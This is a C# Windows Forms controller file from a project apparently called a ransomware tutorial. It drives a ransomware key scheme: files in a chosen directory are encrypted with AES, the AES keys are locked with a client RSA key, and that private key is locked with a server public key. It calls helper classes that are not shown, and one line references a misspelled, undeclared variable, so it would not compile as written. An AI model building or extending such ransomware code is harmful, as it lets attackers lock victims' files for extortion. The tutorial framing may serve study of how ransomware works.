using RansomwareTutorial.Controllers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace RansomwareTutorial
{
    public partial class RansomTutorial : Form
    {
        private static string LockedDataLocation;
        private static string ClientRsaPublicKeyLocation;
        private static string ClientRsaPrivateKeyLocation;
        private static string ServerRsaPrivateKeyLocation;
        private static string ServerRsaPublicKeyLocation;
        private static string AESFilesLocation;
        private static string WorkingDirectoryLocation;
        private static string TargetFilesDirectory;


        public RansomTutorial()
        {
            InitializeComponent();
        }

        public bool RefreshSettings()
        {
            WorkingDirectoryLocation = txtWorkingDirectory.Text;
            TargetFilesDirectory = txtTargetFilesDirectory.Text;

            LockedDataLocation = Path.Combine(TargetFilesDirectory, "LockedData");
            AESFilesLocation = Path.Combine(WorkingDirectoryLocation, "AES");

            ClientRsaPublicKeyLocation = Path.Combine(WorkingDirectoryLocation, "ClientRsaPublicKey.xml");
            ClientRsaPrivateKeyLocation = Path.Combine(WorkingDirectoryLocation, "ClientRsaPrivateKey.xml");
            ServerRsaPublicKeyLocation = Path.Combine(WorkingDirectoryLocation, "ServerRsaPublicKey.xml");
            ServerRsaPrivateKeyLocation = Path.Combine(WorkingDirectoryLocation, "ServerRsaPrivateKey.xml");
            return true;
        }
    
        #region Button_Click
        private void btnEncrypt_Click(object sender, EventArgs e)
        {
            this.RefreshSettings();

            EncryptionProcessor.SetupWorkingItems(WorkingDirectoryLocation, AESFilesLocation, LockedDataLocation, ClientRsaPublicKeyLocation, ClientRsaPrivateKeyLocation);
            EncryptionProcessor.LocateFilesAndEncrypt(TargetFilesDirectodry, AESFilesLocation, LockedDataLocation);
            EncryptionProcessor.LocateAESFilesAndEncrypt(ClientRsaPrivateKeyLocation, AESFilesLocation);
            EncryptionProcessor.LocateClientRSAPrivateKeyAndEncrypt(ClientRsaPrivateKeyLocation, ServerRsaPublicKeyLocation);
        }

        private void btnDecrypt_Click(object sender, EventArgs e)
        {
            DecryptionProcessor.LocateClientPrivateKeyAndDecrypt(ClientRsaPrivateKeyLocation, ServerRsaPrivateKeyLocation);
            DecryptionProcessor.DecryptAESKeys(AESFilesLocation, ClientRsaPrivateKeyLocation);
            DecryptionProcessor.DecryptLockedFiles(AESFilesLocation, LockedDataLocation);
        }

        private void btnGenerateServerKey_Click(object sender, EventArgs e)
        {
            this.RefreshSettings();

            var rsaKey = CryptoHelper.GenerateRSAKeys();

            if (Directory.Exists(WorkingDirectoryLocation))
            {
                File.WriteAllText(ServerRsaPublicKeyLocation, rsaKey.PublicKey);
                File.WriteAllText(ServerRsaPrivateKeyLocation, rsaKey.PrivateKey);
            }
        }
        #endregion
    }
}
